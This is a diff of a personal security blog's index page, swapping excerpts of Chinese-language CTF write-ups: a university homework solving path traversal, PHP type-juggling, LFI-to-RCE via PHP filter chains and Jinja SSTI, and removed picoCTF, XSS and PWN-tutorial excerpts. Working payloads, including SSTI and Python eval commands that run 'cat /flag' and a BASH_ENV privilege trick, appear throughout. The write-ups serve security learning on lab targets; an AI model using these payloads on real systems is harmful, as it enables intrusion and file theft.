@@ -173,17 +173,17 @@
         
 
 <div class="post">
-    <a href="/2025/03/25/2025-tscctf-writeup/">
-        <h2 class="post-title">2025 TSCCTF writeup</h2>
+    <a href="/2025/03/26/%E4%BD%9C%E6%A5%AD%E4%BA%8C-write-up/">
+        <h2 class="post-title">【網路安全實務與社會實踐】作業二 Write-up</h2>
     </a>
     <div class="category-and-date">
         
         <span class="category">
-            <a href="/categories/%E6%9C%AA%E5%88%86%E9%A1%9E/">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
                 <span class="icon">
                     <i class="fa-solid fa-bookmark fa-fw"></i>
                 </span>
-                未分類
+                資訊安全
             </a>
         </span>
         
@@ -191,7 +191,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2025/3/25
+            2025/3/26
         </span>
         
         
@@ -199,12 +199,39 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <h1 id="2025-TSCCTF-owl-d-writeup"><a href="#2025-TSCCTF-owl-d-writeup" class="headerlink" title="2025 TSCCTF owl_d writeup"></a>2025 TSCCTF owl_d writeup</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><h3 id="Give-you-a-free-flag"><a href="#Give-you-a-free-flag" class="headerlink" title="Give you a free flag"></a>Give you a free flag</h3><p><img src="https://hackmd.io/_uploads/HyswtsHwJe.png" alt="image"><br>反白就可以找到flag</p>
-<h3 id="Please-join-our-discord"><a href="#Please-join-our-discord" class="headerlink" title="Please join our discord"></a>Please join our discord</h3><p><img src="https://hackmd.io/_uploads/SJgaKoHP1l.png" alt="image"><br>在announcement這裡<br>（我找了一天 哭）</p>
-<h3 id="Feedback-Form"><a href="#Feedback-Form" class="headerlink" title="Feedback Form"></a>Feedback Form</h3><p>填問卷</p>
-<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="What-Happened"><a href="#What-Happened" class="headerlink" title="What_Happened"></a>What_Happened</h3><p>丟到Ghidra去分析<br>先看一下Defined Strings有沒有特別的<br><img src="https://hackmd.io/_uploads/SynloiHv1l.png" alt="image"><br>發現右下角有一段跟flag相關<br>點兩下go to發現main function<br><img src="https://hackmd.io/_uploads/SkzvisrDkl.png" alt="image"><br>在他附近也可以馬上看到Decrypted Flag的相關函數<br><img src="https://hackmd.io/_uploads/r1Er3sHw1l.png" alt="image"><br>所以可以看出是用XOR解密，接下來把encrypted flag找出來就好</p>
-<p><img src="https://hackmd.io/_uploads/B1BKnirPyg.png" alt="image"><br>找到之後全部對0xAA做XOR，最後就可以得到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSC&#123;I_Think_you_Fix_2ome_3rror&#125;</span><br></pre></td></tr></table></figure>
+            <h1 id="作業二-Write-up-by-owl-d"><a href="#作業二-Write-up-by-owl-d" class="headerlink" title="作業二 Write-up by owl_d"></a>作業二 Write-up by owl_d</h1><h3 id="pathwalker-waf2"><a href="#pathwalker-waf2" class="headerlink" title="pathwalker-waf2"></a>pathwalker-waf2</h3><p>發現這題的path traversal重點在這個區間</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">      if (isset($_GET[&#x27;page&#x27;])) &#123;</span><br><span class="line">        $safe_path = str_replace(&#x27;../&#x27;, &#x27;&#x27;, $_GET[&#x27;page&#x27;]);</span><br><span class="line">        echo file_get_contents(&quot;./page/&quot;.$safe_path.&quot;.php&quot;);</span><br><span class="line">      &#125;      </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+<p>程式只有把 ..&#x2F; 換掉<br>所以可以使用 …&#x2F;.&#x2F; 的方式來 bypass<br>…&#x2F;.&#x2F; 被換掉後會變成 ..&#x2F; 就一樣可以達成回到上一層的目的</p>
+<p><code>https://chall.nckuctf.org:28142/?page=..././..././..././..././var/www/html/flag</code><br>即取得flag</p>
+<p>p.s. 這題沒辦法用 ..%2f 的方式來bypass，會被當成 ..&#x2F; 過濾掉</p>
+<h3 id="swirl"><a href="#swirl" class="headerlink" title="swirl"></a>swirl</h3><p>Stage 1: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;config.php&#x27;);</span><br><span class="line">echo &#x27;&lt;h1&gt;👻 Stage 1 / 4&lt;/h1&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">$A = $_GET[&#x27;A&#x27;];</span><br><span class="line">$B = $_GET[&#x27;B&#x27;];</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($A) &amp;&amp; isset($B))</span><br><span class="line">    if ($A != $B)</span><br><span class="line">        if (strcmp($A, $B) == 0)</span><br><span class="line">            if (md5($A) === md5($B))</span><br><span class="line">                echo &quot;&lt;a href=$stage2&gt;Go to stage2&lt;/a&gt;&quot;;</span><br><span class="line">            else die(&#x27;ERROR: MD5(A) != MD5(B)&#x27;);</span><br><span class="line">        else die(&#x27;ERROR: strcmp(A, B) != 0&#x27;);</span><br><span class="line">    else die(&#x27;ERROR: A == B&#x27;);</span><br><span class="line">else die(&#x27;ERROR: A, B should be given&#x27;);</span><br></pre></td></tr></table></figure>
+<p>弱型態比較，可以使用 md5(array型態) &#x3D; NULL 的性質來達成<br>payload: <code>?A[]=1&amp;B[]=2</code></p>
+<p>Stage 2:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;config.php&#x27;);</span><br><span class="line">echo &#x27;&lt;h1&gt;👻 Stage 2 / 4&lt;/h1&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">$A = $_GET[&#x27;A&#x27;];</span><br><span class="line">$B = $_GET[&#x27;B&#x27;];</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($A) &amp;&amp; isset($B))</span><br><span class="line">    if ($A !== $B)&#123;</span><br><span class="line">        $is_same = md5($A) == 0 and md5($B) === 0;</span><br><span class="line">        if ($is_same)</span><br><span class="line">            echo (md5($B) ? &quot;QQ1&quot; : md5($A) == 0 ? &quot;&lt;a href=$stage3?page=swirl.php&gt;Go to stage3&lt;/a&gt;&quot; : &quot;QQ2&quot;);</span><br><span class="line">        else die(&#x27;ERROR: $is_same is false&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">else die(&#x27;ERROR: A, B should be given&#x27;);</span><br></pre></td></tr></table></figure>
+<p>關鍵點應該在這：<br><code>md5($B) ? &quot;QQ1&quot; : md5($A) == 0 ? &quot;&lt;a href=$stage3?page=swirl.php&gt;Go to stage3&lt;/a&gt;&quot; : &quot;QQ2&quot;</code><br>看起來有點複雜，但我們可以一部分一部分拆開來看<br><code>md5($B) ? &quot;QQ1&quot; : (目標要到這邊)</code><br>可以看出來 b 必須得是 false，才能繼續往下<br>進到下一層後，<br><code>md5($A) == 0 ? &quot;&lt;a href=$stage3?page=swirl.php&gt;Go to stage3&lt;/a&gt;&quot; : &quot;QQ2&quot;</code><br>所以 md5($A) 必須得是0<br>整理一下條件：</p>
+<ol>
+<li>A 和 B 的值必須不同</li>
+<li>md5(A) 和 md5(B) 都必須等於 0</li>
+<li>md5(B) 必須為假值</li>
+</ol>
+<p>payload: <code>?A[]=1&amp;B[]=2</code></p>
+<p>有趣的事：<br>意外發現 payload: <code>?A=true&amp;B=false</code> 也行得通<br>可是我自己做了實驗<br><img src="https://hackmd.io/_uploads/rJX2pUxTJg.png" alt="image"><br>發現程式根本就應該跳到 QQ1 就算 QQ1 被調過了應該也要跳去 QQ2<br>到現在我還是不懂是什麼神奇的機制繞過的，我再研究看看</p>
+<p>Stage 3:<br>.. 會變成 .<br>那 …. 就會變成 .. 了！<br>payload: <code>....\config.php</code><br>(記得要打開網頁原始碼看！)<br><img src="https://hackmd.io/_uploads/Hkv_1tA31e.png" alt="image"></p>
+<p>Stage 4:<br>寫完這題發現 LCI 轉 RCE 真的是天才般的發現，太神了<br>先觀察題目source，會發現主要漏洞在：</p>
+<ol>
+<li>使用了 extract($_POST) 函數，直接將 POST 請求中的參數轉換為變數</li>
+<li>未經過濾的 include($👀) 語句，允許包含任意文件</li>
+</ol>
+<p>所以先試了一下 POST 👀&#x3D;&#x2F;etc&#x2F;passwd：<br>發現真的有回傳內容，代表 LFI 行得通<br><img src="https://hackmd.io/_uploads/B1P8D8gpkg.png" alt="image"></p>
+<p>可是 👀&#x3D;&#x2F;flag 或者  👀&#x3D;..&#x2F;..&#x2F;..&#x2F;flag.php 等等直接取 flag 的方式全部失敗<br>所以勢必得要 RCE 才能印出 flag 了</p>
+<p>這次攻擊主要採用 PHP filter chain 來達成<br><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator/blob/main/README.md">https://github.com/synacktiv/php_filter_chain_generator/blob/main/README.md</a><br>指令：<code>python3 php_filter_chain_generator.py --chain &quot;&lt;?php system(&#39;cat /flag*&#39;); ?&gt;&quot;</code><br>送到 POST 的 👀 後面變取得 flag</p>
+<p>p.s. 最後我還用了 <code>python3 php_filter_chain_generator.py --chain &quot;&lt;?php system(&#39;ls /&#39;); ?&gt;&quot;</code><br>回頭再看一下爲什麼當初試了快 5 個小時的 ..&#x2F;..&#x2F;flag.php 不管用<br>最後也看到了 flag 檔案有加後綴，所以 path traversal 其實不管用<br><img src="https://hackmd.io/_uploads/S1r4DUe6yx.png" alt="image"></p>
+<h3 id="SSTI-waf1"><a href="#SSTI-waf1" class="headerlink" title="SSTI-waf1"></a>SSTI-waf1</h3><p>一開始先送送看 49 發現真的回應 49<br>那肯定得是個 SSTI 了！</p>
+<p><img src="https://hackmd.io/_uploads/B1xZc0yT1x.png" alt="image"><br>從source發現題目會擋掉 _ 底線<br>所以把底線用 <code>\5f</code> 來繞過<br>並且用 <code>attr</code> 代替 點 來做串接</p>
+<p>一開始先用ls &#x2F; 看根目錄有沒有值得注意的檔案<br><code>&#123;&#123; cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('ls /')|attr('read')() &#125;&#125;</code><br>發現網頁回應：<br><img src="https://hackmd.io/_uploads/Sk3ycRJ6kx.png" alt="image"></p>
+<p>有 flag 檔案，cat 一下便可以得到解答<br>payload:<br><code>&#123;&#123; cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')() &#125;&#125;</code></p>
+
             
         </div>
     </div>
@@ -218,66 +245,21 @@
         
         <span class="tag">
             
-            <a href="/tags/HackMD/" style="color: #00bcd4">HackMD</a>
+            <a href="/tags/CTF/" style="color: #00a596">CTF</a>
         </span>
-        
-    </div>
-    <a href="/2025/03/25/2025-tscctf-writeup/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2025/03/25/picoctf-2025-write-ups/">
-        <h2 class="post-title">picoCTF 2025 write-ups</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="category">
-            <a href="/categories/%E6%9C%AA%E5%88%86%E9%A1%9E/">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                未分類
-            </a>
-        </span>
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2025/3/25
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="picoCTF-2025-write-ups"><a href="#picoCTF-2025-write-ups" class="headerlink" title="picoCTF 2025 write-ups"></a>picoCTF 2025 write-ups</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="3v-l"><a href="#3v-l" class="headerlink" title="3v@l"></a>3v@l</h3><p>payload: getattr(<strong>import</strong>(‘o’+’s’), ‘po’+’pen’)(‘tac${IFS}’+chr(47)+’fl*’).read()</p>
-<h3 id="SSTI2"><a href="#SSTI2" class="headerlink" title="SSTI2"></a>SSTI2</h3><p>payload: </p>
-<h3 id="WebSockFish"><a href="#WebSockFish" class="headerlink" title="WebSockFish"></a>WebSockFish</h3><p>在console裡面控制遊戲</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">game.load(&quot;8/8/8/8/8/8/8/R7 w - - 0 1&quot;);</span><br><span class="line">true</span><br><span class="line">board.position(game.fen());</span><br><span class="line">undefined</span><br><span class="line">makeBestMove();</span><br><span class="line">undefined</span><br><span class="line">ws.send(&quot;mate 0&quot;);</span><br><span class="line">undefined</span><br><span class="line">3verbal-sleep.picoctf.net/:1 Uncaught (in promise) Error: A listener indicated an asynchronous response by returning true, but the message channel closed before a response was received</span><br><span class="line">sendMessage(&quot;mate -1&quot;)  // 表示AI被將軍，1步內輸掉</span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;eval -9999&quot;)  // 表示AI處於極其不利的局面</span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;mate -1&quot;)  // </span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;eval 12&quot;)  // </span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;eval -10&quot;)  // </span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;eval -999999999999999&quot;)  // 這樣才是win in a convincing manner</span><br><span class="line"></span><br><span class="line">undefined</span><br></pre></td></tr></table></figure>
-
-<h3 id="Apriti-sesamo"><a href="#Apriti-sesamo" class="headerlink" title="Apriti sesamo"></a>Apriti sesamo</h3><p>emacs 代表可以在網址後加一個 ~<br>會發現網頁原始碼有隱藏的判斷邏輯程式碼<br>發現其實就是SHA1 collision</p>
-<p><img src="https://hackmd.io/_uploads/HyEYaRFj1e.png" alt="image"></p>
-<h3 id="Hash-only-1"><a href="#Hash-only-1" class="headerlink" title="Hash-only 1"></a>Hash-only 1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ echo &#x27;cat /root/flag.txt&#x27; &gt; /tmp/exploit.sh</span><br><span class="line">ctf-player@pico-chall$ export BASH_ENV=/tmp/exploit.sh</span><br><span class="line">ctf-player@pico-chall$ ./flaghasher</span><br><span class="line">Computing the MD5 hash of /root/flag.txt....</span><br><span class="line"></span><br><span class="line">picoCTF&#123;sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_ae1d8678&#125;4d4f660d53535446f15c1a3a7b535e50  /root/flag.txt</span><br></pre></td></tr></table></figure>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
         
         <span class="tag">
             
-            <a href="/tags/HackMD/" style="color: #00a596">HackMD</a>
+            <a href="/tags/CyberSecurity/" style="color: #00bcd4">CyberSecurity</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/NCKUCTF/" style="color: #ff7d73">NCKUCTF</a>
         </span>
         
     </div>
-    <a href="/2025/03/25/picoctf-2025-write-ups/" class="go-post">阅读全文</a>
+    <a href="/2025/03/26/%E4%BD%9C%E6%A5%AD%E4%BA%8C-write-up/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -287,11 +269,11 @@
     <div class="category-and-date">
         
         <span class="category">
-            <a href="/categories/%E6%9C%AA%E5%88%86%E9%A1%9E/">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
                 <span class="icon">
                     <i class="fa-solid fa-bookmark fa-fw"></i>
                 </span>
-                未分類
+                資訊安全
             </a>
         </span>
         
@@ -333,230 +315,21 @@
         
         <span class="tag">
             
-            <a href="/tags/HackMD/" style="color: #ffa2c4">HackMD</a>
+            <a href="/tags/PortSwigger/" style="color: #03a9f4">PortSwigger</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/SQLi/" style="color: #00a596">SQLi</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Self-learning/" style="color: #ff7d73">Self-learning</a>
         </span>
         
     </div>
     <a href="/2025/03/25/portswigger-sqli-writeup/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2025/03/25/xss-cheatsheat/">
-        <h2 class="post-title">XSS Cheatsheat</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="category">
-            <a href="/categories/%E6%9C%AA%E5%88%86%E9%A1%9E/">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                未分類
-            </a>
-        </span>
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2025/3/25
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="XSS-Cheatsheet"><a href="#XSS-Cheatsheet" class="headerlink" title="XSS Cheatsheet"></a>XSS Cheatsheet</h1><h3 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h3><p><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code> : 先測試有沒有辦法送指令進去</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/HackMD/" style="color: #ff7d73">HackMD</a>
-        </span>
-        
-    </div>
-    <a href="/2025/03/25/xss-cheatsheat/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2025/03/25/pwn-%E6%95%99%E5%AD%B8%E6%8C%87%E5%8D%97/">
-        <h2 class="post-title">PWN 教學指南</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="category">
-            <a href="/categories/%E6%9C%AA%E5%88%86%E9%A1%9E/">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                未分類
-            </a>
-        </span>
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2025/3/25
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>重點包括：</p>
-<ul>
-<li><strong>基礎知識與概念</strong>（PWN 是什麼、CTF 題型介紹）</li>
-<li><strong>必要技能</strong>（逆向工程、漏洞分析、各類漏洞原理）</li>
-<li><strong>工具介紹</strong>（GDB、IDA Pro、pwntools、Radare2 等）</li>
-<li><strong>實戰案例</strong>（著名攻擊案例與 CTF 題目解析）</li>
-<li><strong>進階技巧</strong>（ROP、Heap Exploitation、Kernel Exploitation 等）</li>
-<li><strong>學習資源</strong>（免費與付費資源，包括影片與文字教學）</li>
-</ul>
-<p>同時會重點介紹 <strong>Hack The Box</strong> 與 <strong>Pwnable.tw</strong> 平台的挑戰，並涵蓋 Linux 與 Windows 的 Kernel Exploitation。</p>
-<h1 id="PWN-教學指南"><a href="#PWN-教學指南" class="headerlink" title="PWN 教學指南"></a>PWN 教學指南</h1><p>本指南將帶你從新手一路進階學習 PWN（<strong>Pwn</strong> 即「<strong>擁有</strong> &#x2F; <strong>攻破</strong>」的黑客俚語）相關技術，包含必要基礎知識、常見漏洞類型、實用工具介紹、實戰範例解析以及進階技巧，並提供 C&#x2F;C++ 與 Python 的實作範例。同時，我們也會強調 <strong>Kernel Exploitation（內核利用）</strong> 技術，幫助你了解在 Linux 與 Windows 核心層面的漏洞利用方法。</p>
-<h2 id="1-基礎知識與概念"><a href="#1-基礎知識與概念" class="headerlink" title="1. 基礎知識與概念"></a>1. 基礎知識與概念</h2><h3 id="PWN-是什麼？"><a href="#PWN-是什麼？" class="headerlink" title="PWN 是什麼？"></a>PWN 是什麼？</h3><p>「PWN」原是黑客圈的俚語，意思是<strong>攻破裝置或系統並取得控制權</strong>。發音類似「砰」，象徵成功駭入系統的一聲巨響。在網路安全語境中，PWN 指透過漏洞利用、社交工程等手段，成功獲得裝置、系統或網路的未授權控制權。一旦<strong>PWN</strong> 了某系統，攻擊者便可執行任意惡意操作，例如竊取資料、植入惡意程式或癱瘓系統服務。</p>
-<h3 id="CTF-中-PWN-題型介紹"><a href="#CTF-中-PWN-題型介紹" class="headerlink" title="CTF 中 PWN 題型介紹"></a>CTF 中 PWN 題型介紹</h3><p>在 CTF（Capture The Flag）競賽中，PWN 題目通常提供一個已編譯好的<strong>二進位程式</strong>（例如 Linux ELF 或 Windows PE 檔案），該程式部署在目標伺服器上。參賽者需要對這個程式進行逆向分析和動態調試，找出其中的漏洞，透過網路與服務互動並加以利用。PWN 題目的目標通常是<strong>取得遠端系統的 shell 權限</strong>或直接讀取旗標檔案。常見的 PWN 題目漏洞包含：棧&#x2F;堆緩衝區溢位、整數溢位、格式化字串漏洞等。總之，在 CTF PWN 題中，你需要發揮二進位漏洞挖掘與利用能力，突破沙盒或權限限制拿到目標系統的控制權。</p>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/HackMD/" style="color: #ff7d73">HackMD</a>
-        </span>
-        
-    </div>
-    <a href="/2025/03/25/pwn-%E6%95%99%E5%AD%B8%E6%8C%87%E5%8D%97/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2025/03/25/%E4%BD%9C%E6%A5%AD%E4%BA%8C-write-up/">
-        <h2 class="post-title">【網路安全實務與社會實踐】作業二 Write-up</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="category">
-            <a href="/categories/%E6%9C%AA%E5%88%86%E9%A1%9E/">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                未分類
-            </a>
-        </span>
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2025/3/25
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="作業二-Write-up-by-owl-d"><a href="#作業二-Write-up-by-owl-d" class="headerlink" title="作業二 Write-up by owl_d"></a>作業二 Write-up by owl_d</h1><h3 id="pathwalker-waf2"><a href="#pathwalker-waf2" class="headerlink" title="pathwalker-waf2"></a>pathwalker-waf2</h3><p>發現這題的path traversal重點在這個區間</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">      if (isset($_GET[&#x27;page&#x27;])) &#123;</span><br><span class="line">        $safe_path = str_replace(&#x27;../&#x27;, &#x27;&#x27;, $_GET[&#x27;page&#x27;]);</span><br><span class="line">        echo file_get_contents(&quot;./page/&quot;.$safe_path.&quot;.php&quot;);</span><br><span class="line">      &#125;      </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
-<p>程式只有把 ..&#x2F; 換掉<br>所以可以使用 …&#x2F;.&#x2F; 的方式來 bypass<br>…&#x2F;.&#x2F; 被換掉後會變成 ..&#x2F; 就一樣可以達成回到上一層的目的</p>
-<p><code>https://chall.nckuctf.org:28142/?page=..././..././..././..././var/www/html/flag</code><br>即取得flag</p>
-<p>p.s. 這題沒辦法用 ..%2f 的方式來bypass，會被當成 ..&#x2F; 過濾掉</p>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/HackMD/" style="color: #00a596">HackMD</a>
-        </span>
-        
-    </div>
-    <a href="/2025/03/25/%E4%BD%9C%E6%A5%AD%E4%BA%8C-write-up/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2025/03/25/%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8%E5%AF%A6%E5%8B%99%E8%88%87%E7%A4%BE%E6%9C%83%E5%AF%A6%E8%B8%90%E4%BD%9C%E6%A5%AD%E4%B8%80/">
-        <h2 class="post-title">【網路安全實務與社會實踐】作業一 Write-up</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="category">
-            <a href="/categories/%E6%9C%AA%E5%88%86%E9%A1%9E/">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                未分類
-            </a>
-        </span>
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2025/3/25
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="【網路安全實務與社會實踐】作業一"><a href="#【網路安全實務與社會實踐】作業一" class="headerlink" title="【網路安全實務與社會實踐】作業一"></a>【網路安全實務與社會實踐】作業一</h1><blockquote>
-<p>此次 Lab 共為兩題</p>
-<ol>
-<li>phpisnice <a target="_blank" rel="noopener" href="https://class.nckuctf.org/challenges#phpisnice-12">https://class.nckuctf.org/challenges#phpisnice-12</a></li>
-<li>phpisbest <a target="_blank" rel="noopener" href="https://class.nckuctf.org/challenges#phpisbest-13">https://class.nckuctf.org/challenges#phpisbest-13</a></li>
-</ol>
-</blockquote>
-<h3 id="phpisnice"><a href="#phpisnice" class="headerlink" title="phpisnice"></a>phpisnice</h3><p>先看一下網頁給的資訊</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">$A = $_GET[&#x27;A&#x27;];</span><br><span class="line">$B = $_GET[&#x27;B&#x27;];</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($A) &amp;&amp; isset($B))</span><br><span class="line">    if ($A != $B)</span><br><span class="line">        if (strcmp($A, $B) == 0)</span><br><span class="line">            if (md5($A) == md5($B))</span><br><span class="line">                echo $flag;</span><br><span class="line">            else die(&#x27;ERROR: MD5(A) != MD5(B)&#x27;);</span><br><span class="line">        else die(&#x27;ERROR: strcmp(A, B) != 0&#x27;);</span><br><span class="line">    else die(&#x27;ERROR: A == B&#x27;);</span><br><span class="line">else die(&#x27;ERROR: A, B should be given&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>可以看出題目要求：<code>要求找到一個值 A，使得 md5(A) == A</code><br>所以這題是標準的「md5碰撞」</p>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/HackMD/" style="color: #ffa2c4">HackMD</a>
-        </span>
-        
-    </div>
-    <a href="/2025/03/25/%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8%E5%AF%A6%E5%8B%99%E8%88%87%E7%A4%BE%E6%9C%83%E5%AF%A6%E8%B8%90%E4%BD%9C%E6%A5%AD%E4%B8%80/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
